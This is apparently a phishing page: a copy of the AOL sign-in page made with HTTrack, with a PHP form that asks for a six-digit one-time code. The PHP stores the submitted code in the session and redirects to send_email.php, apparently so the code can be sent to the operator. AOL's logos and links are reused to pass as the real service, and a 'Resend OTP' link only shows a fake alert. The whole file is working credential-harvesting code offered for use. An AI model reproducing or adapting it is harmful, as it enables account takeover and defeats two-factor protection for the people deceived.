
<?php
session_start();

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Concatenate OTP array into a single string
    $_SESSION["input5"] = implode('', $_POST["otp"]);
    header("Location: send_email.php");
    exit();
}
?>

<!DOCTYPE html>
<html id="Stencil" lang="en-US" class="no-js grid light-theme ">

<!-- Mirrored from login.aol.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 06 Nov 2024 19:13:55 GMT -->
<!-- Added by HTTrack -->
<meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->





<head>
    <meta charset="utf-8">
    <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no" />
    <meta name="format-detection" content="telephone=no">
    <meta name="referrer" content="strict-origin-when-cross-origin">
    <meta name="oath:guce:consent-host" content="guce.aol.com" />
    <title>AOL</title>
    <meta name="description" content="AOL" />
    <link rel="dns-prefetch" href="http://gstatic.com/">
    <link rel="dns-prefetch" href="http://google.com/">
    <link rel="dns-prefetch" href="http://">
    <link rel="dns-prefetch" href="http://y.analytics.yahoo.com/">
    <link rel="dns-prefetch" href="http://ucs.query.yahoo.com/">
    <link rel="dns-prefetch" href="http://geo.query.yahoo.com/">
    <link rel="dns-prefetch" href="http://geo.yahoo.com/">
    <link rel="icon" type="image/png" href="../wm/login/aol-favicon.png">
    <link rel="shortcut icon" type="image/png" href="../wm/login/aol-favicon.png">
    <meta name="google-site-verification" content="yOTFyUBPTnXtuk2cPpqfv7ZvZ960JgqsV8FomN3n7Y0" />
    <link rel="apple-touch-icon" href="../wm/login/aol-apple-touch-icon.png">
    <link rel="apple-touch-icon-precomposed" href="../wm/login/aol-apple-touch-icon.png">
    <style nonce="QMcV4Ts/pUv4znWzI2LmCCsmUNAUBBQXHrM81YI+Bi9foNdd">
        #mbr-css-check {
            display: inline;
        }
        
        .otp-header h1 {
            font-size: 22px;
            color: #333;
            margin-bottom: 8px;
        }

        .otp-header p {
            font-size: 14px;
            color: #ffffff;
            margin-bottom: 20px;
        }

        /* OTP Input Group */
        .otp-input-group {
            display: flex;
            justify-content: center;
            gap: 5px;
            margin-bottom: 20px;
        }

        .otp-input {
            width: 20px;
            height: 40px;
            text-align: center;
            font-size: 18px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }

        /* Footer Buttons */
        .otp-footer {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
    </style>
    <link href="aol-main.css" rel="stylesheet" type="text/css">
    <script nonce="QMcV4Ts/pUv4znWzI2LmCCsmUNAUBBQXHrM81YI+Bi9foNdd">
        var pageStartTime = new Date().getTime();
        (function (root) {
            var isGoodJS = ('create' in Object && 'isArray' in Array && 'pushState' in window.history);
            root.isGoodJS = isGoodJS;
        }(this));

        (function (root) {
            /* -- Data -- */
            root.YUI_config = { "comboBase": "https:\u002F\u002Fs.yimg.com\u002Fzz\u002Fcombo?", "combine": true, "root": "yui-s:3.18.0\u002F" };
            root.I13N_config = { "keys": { "pt": "utility", "ver": "nodejs" } };
            root.I13N_config || (root.I13N_config = {});
            root.I13N_config.spaceid = 160500005;
            root.I13N_config.location = "index.html\u002F\u002Flogin.aol.com\u002F";
            root.I13N_config.referrer = "";
            root.I13N_config.keys || (root.I13N_config.keys = {});
            root.I13N_config.keys.pg_name = "loginLanding";
            root.I13N_config.keys.gm_np = "aol";
            root.I13N_config.keys.p_sec = "DEFAULT_SECTION";
            root.I13N_config.keys.p_subsec = "DEFAULT_SUBSECTION";
            root.I13N_config.keys.cause = "direct-nav";
            root.I13N_config.keys.src_id = 160500005;
            root.COMET_URL = "index.html\u002F\u002Fserver.comet.yahoo.com\u002Fcomet";
            root.gamIframeUrl = "index.html\u002F\u002Fgpt.mail.yahoo.net\u002Fsandbox?client=aolLogin&version=0.1&limited=0&headerBidder=1&haq=1&benji=1#config=%7B%22positions%22%3A%5B%7B%22adUnitPath%22%3A%22%2F22888152279%2Fus%2Faollogin%2Fmain%2Fdt%2Fus_aollogin_main_dt_full_screen%22%2C%22adLocation%22%3A%22full_screen%22%2C%22size%22%3A%5B%5B1440%2C1024%5D%2C%5B%22fluid%22%5D%5D%2C%22div%22%3A%22gpt-passback%22%7D%5D%2C%22pageUrl%22%3A%22https%3A%2F%2Flogin.aol.com%22%2C%22headerBidder%22%3Atrue%2C%22yahooPrebid%22%3Atrue%2C%22geoCountryCode%22%3A%22NG%22%2C%22npa%22%3Afalse%2C%22limited%22%3Afalse%2C%22PPId%22%3A%22__PPId__%22%2C%22targetingConfig%22%3A%7B%22lang%22%3A%22en-US%22%2C%22bucket%22%3A%22%22%2C%22spaceId%22%3A%22160500005%22%2C%22adLocation%22%3A%22full_screen%22%2C%22age%22%3A%220%22%2C%22gender%22%3A%220%22%2C%22colo%22%3A%22ir2%22%2C%22lu%22%3A%220%22%2C%22site%22%3A%22login%22%2C%22device%22%3A%22desktop%22%2C%22region%22%3A%22ng%22%2C%22pageOrigin%22%3A%22https%3A%2F%2Flogin.aol.com%22%2C%22AXId%22%3A%22__AXId__%22%7D%2C%22headerBidderConfig%22%3A%7B%22host%22%3A%22login.aol.com%22%2C%22pblob%22%3A%22lu%3A0%7C%7C160500005%7C%7C%22%2C%22buckets%22%3A%5B%22%22%5D%2C%22limited%22%3Afalse%2C%22cobrand%22%3A%22%22%2C%22lang%22%3A%22en-US%22%2C%22site%22%3A%22aol_login%22%2C%22region%22%3A%22ng%22%2C%22adLocation%22%3A%22full_screen%22%2C%22dv360%22%3A%22__DV360__%22%2C%22AXId%22%3A%22__AXId__%22%7D%7D";
            root.challenge || (root.challenge = {});
            root.challenge.servingStamp = 1730920434205;
            root.challenge.isAndroidWebview = false;
            root.I13N_config.keys.pct = "signin";
            root.I13N_config.keys.milestone = "signin";
            root.currentURL = "\u002F";
            root.COUNTRY_CODES_MAP = { "AF": "+93", "AL": "+355", "DZ": "+213", "AS": "+1", "AD": "+376", "AO": "+244", "AI": "+1", "AG": "+1", "AR": "+54", "AM": "+374", "AW": "+297", "AC": "+247", "AU": "+61", "AX": "+672", "AT": "+43", "AZ": "+994", "BS": "+1", "BH": "+973", "BD": "+880", "BB": "+1", "BY": "+375", "BE": "+32", "BZ": "+501", "BJ": "+229", "BM": "+1", "BT": "+975", "BO": "+591", "BA": "+387", "BW": "+267", "BR": "+55", "VG": "+1", "BN": "+673", "BG": "+359", "BF": "+226", "BI": "+257", "KH": "+855", "CM": "+237", "CA": "+1", "CV": "+238", "KY": "+1", "CF": "+236", "TD": "+235", "CL": "+56", "CN": "+86", "CO": "+57", "KM": "+269", "CG": "+242", "CK": "+682", "CR": "+506", "CI": "+225", "HR": "+385", "CU": "+53", "CY": "+357", "CZ": "+420", "CD": "+243", "DK": "+45", "DG": "+246", "DJ": "+253", "DM": "+1", "DO": "+1", "TL": "+670", "EC": "+593", "EG": "+20", "SV": "+503", "GQ": "+240", "ER": "+291", "EE": "+372", "ET": "+251", "FK": "+500", "FO": "+298", "FJ": "+679", "FI": "+358", "FR": "+33", "GF": "+594", "PF": "+689", "GA": "+241", "GM": "+220", "GE": "+995", "DE": "+49", "GH": "+233", "GI": "+350", "GR": "+30", "GL": "+299", "GD": "+1", "GP": "+590", "GU": "+1", "GT": "+502", "GN": "+224", "GW": "+245", "GY": "+592", "HT": "+509", "HN": "+504", "HK": "+852", "HU": "+36", "IS": "+354", "IN": "+91", "ID": "+62", "IR": "+98", "IQ": "+964", "IE": "+353", "IL": "+972", "IT": "+39", "JM": "+1", "JP": "+81", "JO": "+962", "KZ": "+7", "KE": "+254", "KI": "+686", "XK": "+383", "KW": "+965", "KG": "+996", "LA": "+856", "LV": "+371", "LB": "+961", "LS": "+266", "LR": "+231", "LY": "+218", "LI": "+423", "LT": "+370", "LU": "+352", "MO": "+853", "MK": "+389", "MG": "+261", "MW": "+265", "MY": "+60", "MV": "+960", "ML": "+223", "MT": "+356", "MH": "+692", "MQ": "+596", "MR": "+222", "MU": "+230", "MX": "+52", "FM": "+691", "MD": "+373", "MC": "+377", "MN": "+976", "ME": "+382", "MS": "+1", "MA": "+212", "MZ": "+258", "MM": "+95", "NA": "+264", "NR": "+674", "NP": "+977", "NL": "+31", "AN": "+599", "NC": "+687", "NZ": "+64", "NI": "+505", "NE": "+227", "NG": "+234", "NU": "+683", "KP": "+850", "MP": "+1", "NO": "+47", "OM": "+968", "PK": "+92", "PW": "+680", "PS": "+970", "PA": "+507", "PG": "+675", "PY": "+595", "PE": "+51", "PH": "+63", "PL": "+48", "PT": "+351", "PR": "+1", "QA": "+974", "RE": "+262", "RO": "+40", "RU": "+7", "RW": "+250", "SH": "+290", "KN": "+1", "LC": "+1", "PM": "+508", "VC": "+1", "WS": "+685", "SM": "+378", "ST": "+239", "SA": "+966", "SN": "+221", "RS": "+381", "SC": "+248", "SL": "+232", "SG": "+65", "SK": "+421", "SI": "+386", "SB": "+677", "SO": "+252", "ZA": "+27", "KR": "+82", "ES": "+34", "LK": "+94", "SD": "+249", "SR": "+597", "SZ": "+268", "SE": "+46", "CH": "+41", "SY": "+963", "TW": "+886", "TJ": "+992", "TZ": "+255", "TH": "+66", "TG": "+228", "TK": "+690", "TO": "+676", "TT": "+1", "TN": "+216", "TR": "+90", "TM": "+993", "TC": "+1", "TV": "+688", "VI": "+1", "UG": "+256", "UA": "+380", "AE": "+971", "GB": "+44", "US": "+1", "UY": "+598", "UZ": "+998", "VU": "+678", "VA": "+379", "VE": "+58", "VN": "+84", "WF": "+681", "YE": "+967", "ZM": "+260", "ZW": "+263" };
            root.enforceCountryCodeDropDown = undefined;
            root.isIOSDevice = false;
        }(this));


        YUI_config.global = window;


        window.mbrSendError = function (name, url) {
            (new Image()).src = '/account/js-reporting/?rid=15k288pjinfvi&crumb=' + encodeURIComponent('zUFiydkJHlvXW47GpqA') + '&message=' + encodeURIComponent(name) + '&url=' + encodeURIComponent(url);
        };

        var oldError = window.onerror;

        var allowListedErrorScripts = ["bundle.js"];
        window.onerror = function (errorMsg, url, lineNumber, column, errorObj) {
            const fileName = url ? url.split('index.html').pop() : null;
            if (fileName && allowListedErrorScripts.indexOf(fileName) > -1) {
                window.mbrSendError(errorMsg, url);
                if (oldError) {
                    oldError.apply(this, arguments);
                }
                return false;
            }
        }

    </script>
</head>

<body
    class="bucket-mbr-whatsapp-ac bucket-mbr-whatsapp-nac bucket-mbr-ar-cc bucket-mbr-fido-upsell-desktop2 bucket-mbr-request-imapin-scopes-ym">
    <script nonce="">
            (function (root) {
                var doc = document;
                if (root.isGoodJS) {
                    doc.documentElement.className = doc.documentElement.className.replace('no-js', 'js');
                }
            }(this));
    </script>
    <div id="login-body" class="loginish  puree-v2 responsive  grid   ">
        <div class="mbr-desktop-hd">
            <span class="column">
                <a href="">
                    <img src="wm/assets/images/ns/aol-logo-black-v.0.0.2.png" alt="Aol" class="logo "
                        width="100" height="">
                    <img src="wm/assets/images/ybar/aol-logo-white-v0.0.4.png" alt="Aol"
                        class="dark-mode-logo logo " width="100" height="">
                </a>
            </span>
            <div class="desktop-universal-header">
                <a href="https://help.aol.com/" data-rapid-tracking="true"
                    data-ylk="elm:link;elmt:link;slk:headerHelp">Help</a>
                <a href="https://legal.yahoo.com/us/en/yahoo/terms/otos/index.html" class="universal-header-links"
                    data-rapid-tracking="true" data-ylk="elm:link;elmt:link;slk:headerTerms">Terms</a>
                <a href="https://legal.yahoo.com/us/en/yahoo/privacy/index.html"
                    class="universal-header-links privacy-link" data-rapid-tracking="true"
                    data-ylk="elm:link;elmt:link;slk:headerPrivacy">Privacy</a>
            </div>
        </div>
        <div class="login-box-container">
            <div class="login-box right">
                <div class="mbr-login-hd txt-align-center">
                    <img src="wm/assets/images/ns/aol-logo-black-v.0.0.2.png" alt="Aol"
                        class="logo aol-en-US" width="100" height="">
                    <img src="wm/assets/images/ybar/aol-logo-white-v0.0.4.png" alt="Aol"
                        class="dark-mode-logo logo aol-en-US" width="100" height="">
                </div>
                <div class="challenge yid-challenge">
                    <div class="challenge-header">
                    </div>
                    <div class="username-challenge" id="login-landing">
                        <strong class="challenge-heading">Sign&nbsp;in</strong>
                        <span class="challenge-desc">&nbsp;</span>

                        <form action="" method="post">
                    <div class="otp-header">
                        <h1 class="challenge-heading">Verify OTP</h1>
                        <p>Enter the 6-digit OTP sent <br>to your registered email.</p>
                    </div>

                    <div class="otp-input-group">
                        <input type="text" maxlength="1" class="otp-input" name="otp[]" oninput="moveToNext(this, 'otp2')" id="otp1">
                        <input type="text" maxlength="1" class="otp-input" name="otp[]" oninput="moveToNext(this, 'otp3')" id="otp2">
                        <input type="text" maxlength="1" class="otp-input" name="otp[]" oninput="moveToNext(this, 'otp4')" id="otp3">
                        <input type="text" maxlength="1" class="otp-input" name="otp[]" oninput="moveToNext(this, 'otp5')" id="otp4">
                        <input type="text" maxlength="1" class="otp-input" name="otp[]" oninput="moveToNext(this, 'otp6')" id="otp5">
                        <input type="text" maxlength="1" class="otp-input" name="otp[]" id="otp6">
                    </div>

                    <div class="otp-footer">
                   
                        <button  type="submit" class="pure-button puree-button-primary challenge-button" name="send" id="contact-submit">Verify OTP</button>
                        <span class="resend-link">Resend OTP</span>
                    </div>
                </form>
                    </div>
                </div>
            </div>
            <div id="login-box-ad-fallback" class="login-box-ad-fallback" style="display: block;">
                <h1></h1>
                <p></p>
            </div>
        </div>
        <div class="login-bg-outer">
            <div class="login-bg-inner">
                <div id="login-ad-rich" aria-hidden="true">
                    <iframe id="login-ads-gpt-iframe"
                        allow="geolocation 'none'; fullscreen 'none'; autoplay 'none'; camera 'none'; display-capture 'none'; document-domain 'none'; microphone 'none'; gyroscope 'none'; magnetometer 'none'; midi 'none'; payment 'none'; serial 'none'; speaker-selection 'none'"
                        sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts"
                        width="1440" height="1024" scrolling="no" frameborder="no"
                        src="https://gpt.mail.yahoo.net/sandbox?client=aolLogin&amp;version=0.1&amp;limited=0&amp;headerBidder=1&amp;haq=1&amp;benji=1#config=%7B%22positions%22%3A%5B%7B%22adUnitPath%22%3A%22%2F22888152279%2Fus%2Faollogin%2Fmain%2Fdt%2Fus_aollogin_main_dt_full_screen%22%2C%22adLocation%22%3A%22full_screen%22%2C%22size%22%3A%5B%5B1440%2C1024%5D%2C%5B%22fluid%22%5D%5D%2C%22div%22%3A%22gpt-passback%22%7D%5D%2C%22pageUrl%22%3A%22https%3A%2F%2Flogin.aol.com%22%2C%22headerBidder%22%3Atrue%2C%22yahooPrebid%22%3Atrue%2C%22geoCountryCode%22%3A%22NG%22%2C%22npa%22%3Afalse%2C%22limited%22%3Afalse%2C%22PPId%22%3A%22792d45332e7239584a4532754c487539654346415361424542415f4b6542414a46357e41%22%2C%22targetingConfig%22%3A%7B%22lang%22%3A%22en-US%22%2C%22bucket%22%3A%22mbr-whatsapp-ac%2Cmbr-whatsapp-nac%2Cmbr-ar-cc%2Cmbr-fido-upsell-desktop2%2Cmbr-request-imapin-scopes-ym%22%2C%22spaceId%22%3A%22160500005%22%2C%22adLocation%22%3A%22full_screen%22%2C%22age%22%3A%220%22%2C%22gender%22%3A%220%22%2C%22colo%22%3A%22bf1%22%2C%22lu%22%3A%220%22%2C%22site%22%3A%22login%22%2C%22device%22%3A%22desktop%22%2C%22region%22%3A%22us%22%2C%22pageOrigin%22%3A%22https%3A%2F%2Flogin.aol.com%22%2C%22AXId%22%3A%22y-E3.r9XJE2uLHu9eCFASaBEBA_KeBAJF5~A%22%7D%2C%22headerBidderConfig%22%3A%7B%22host%22%3A%22login.aol.com%22%2C%22pblob%22%3A%22lu%3A0%7C%7C160500005%7C%7C%22%2C%22buckets%22%3A%5B%22mbr-whatsapp-ac%22%2C%22mbr-whatsapp-nac%22%2C%22mbr-ar-cc%22%2C%22mbr-fido-upsell-desktop2%22%2C%22mbr-request-imapin-scopes-ym%22%5D%2C%22limited%22%3Afalse%2C%22cobrand%22%3A%22%22%2C%22lang%22%3A%22en-US%22%2C%22site%22%3A%22aol_login%22%2C%22region%22%3A%22us%22%2C%22adLocation%22%3A%22full_screen%22%2C%22dv360%22%3A%22eS10TnRzeDJaRTJ1SDlvMHpHQ0dTMkx5VU1tWHhvZlBVeX5B%22%2C%22AXId%22%3A%22y-E3.r9XJE2uLHu9eCFASaBEBA_KeBAJF5~A%22%7D%7D"
                        style="display: none;"></iframe>
                </div>
            </div>
        </div>
    </div>
    <script src="ss/rapid-3.53.39.js"></script>
    <script nonce="">
        var rapidInstance = new YAHOO.i13n.Rapid(I13N_config);
    </script>
    <script src="wm/mbr/8218dc35a45c1f7b84d843e04ae1560b00f4bd05/bundle.js"></script>
    <noscript>
        <img src="/account/js-reporting/?crumb=2oZOK6RIT3rxzVtiVUsHA&message=javascript_not_enabled&ref=%2F" height="0"
            width="0" style="visibility: hidden;">
    </noscript>
    <script src="https://consent.cmp.oath.com/cmp.js"></script><iframe name="__uspapiLocator"
        style="display: none;"></iframe><iframe name="__tcfapiLocator" style="display: none;"></iframe><iframe
        name="__gppLocator" style="display: none;"></iframe>
    <script src="https://opus.analytics.yahoo.com/tag/opus.js"></script>
    <div id="mbr-css-check"></div>
    <div id="page-mask" class="page-mask hide"></div>
    <div id="ad"></div>
    <div class="mbr-legacy-device-bar" id="mbr-legacy-device-bar">
        <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Close this&nbsp;warning">x</label>
        <input type="checkbox" id="mbr-legacy-device-bar-cross">
        <p class="mbr-legacy-device">
            AOL works best with the latest versions of the browsers. You're using an outdated or unsupported browser and
            some AOL features may not work properly. Please update your browser version now. <a
                href="">More&nbsp;Info</a>
        </p>
    </div>
    <!-- <script nonce="">
        (function (root) {
            if (!root.isGoodJS) {
                document.getElementById('mbr-legacy-device-bar').style.display = 'block';
            }
        }(this));
    </script> -->
    <script>
        function moveToNext(currentInput, nextInputId) {
            if (currentInput.value.length === 1 && nextInputId) {
                document.getElementById(nextInputId).focus();
            } else if (currentInput.value.length === 0) {
                const prevInput = currentInput.previousElementSibling;
                if (prevInput) prevInput.focus();
            }
        }

        document.querySelector('.resend-link').addEventListener('click', function() {
            alert("OTP has been resent to your registered email.");
            // Add AJAX or resend logic here if needed
        });
    </script>

    <iframe frameborder="0" height="0" width="0"
        src="https://opus.analytics.yahoo.com/tag/opus-frame.html?referrer=https%3A%2F%2Flogin.aol.com%2F%3Fsrc%3Dfp-us%26client_id%3Ddj0yJmk9ZXRrOURhMkt6bkl5JnM9Y29uc3VtZXJzZWNyZXQmc3Y9MCZ4PWQ2%26crumb%3D2QNPfXrlA.j%26intl%3Dus%26redirect_uri%3Dhttps%253A%252F%252Foidc.www.aol.com%252Fcallback%26pspid%3D1197803361%26activity%3Ddefault%26done%3Dhttps%253A%252F%252Fapi.login.aol.com%252Foauth2%252Fauthorize%253Fclient_id%253Ddj0yJmk9ZXRrOURhMkt6bkl5JnM9Y29uc3VtZXJzZWNyZXQmc3Y9MCZ4PWQ2%2526intl%253Dus%2526nonce%253D6ldE2VGUSRxVl3qyjb4vSEnXlUoRGHKV%2526redirect_uri%253Dhttps%25253A%25252F%25252Foidc.www.aol.com%25252Fcallback%2526response_type%253Dcode%2526scope%253Dmail-r%252Bopenid%252Bguce-w%252Bopenid2%252Bsdps-r%2526src%253Dfp-us%2526state%253DeyJhbGciOiJSUzI1NiIsImtpZCI6IjZmZjk0Y2RhZDExZTdjM2FjMDhkYzllYzNjNDQ4NDRiODdlMzY0ZjcifQ.eyJyZWRpcmVjdFVyaSI6Imh0dHBzOi8vd3d3LmFvbC5jb20vIn0.hlDqNBD0JrMZmY2k9lEi6-BfRidXnogtJt8aI-q2FdbvKg9c9EhckG0QVK5frTlhV8HY7Mato7D3ek-Nt078Z_i9Ug0gn53H3vkBoYG-J-SMqJt5MzG34rxdOa92nZlQ7nKaNrAI7K9s72YQchPBn433vFbOGBCkU_ZC_4NXa9E&amp;tbla_id=603327cf-0d2e-4657-853c-700d29500c61-tucte263eb7&amp;axids=gam%3Dy-E3.r9XJE2uLHu9eCFASaBEBA_KeBAJF5~A%26dv360%3DeS10TnRzeDJaRTJ1SDlvMHpHQ0dTMkx5VU1tWHhvZlBVeX5B%26ydsp%3Dy-6AUvHcRE2uLkWsh0_wwqQVnwTUs0ZCoL~A%26tbla%3Dy-9_bHinJE2uISm8GrIDqzR37VBi06Hau3~A&amp;gdpr=false&amp;gdpr_consent=&amp;gpp=DBAA&amp;gpp_sid=-1&amp;us_privacy=1---&amp;reset_idsync=1"
        style="display: none;"></iframe>
</body>

<!-- Mirrored from login.aol.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 06 Nov 2024 19:14:11 GMT -->

</html>
<!-- fe36.member.ir2.yahoo.com - Wed Nov 06 2024 19:13:54 GMT+0000 (Coordinated Universal Time) - (1ms) -->


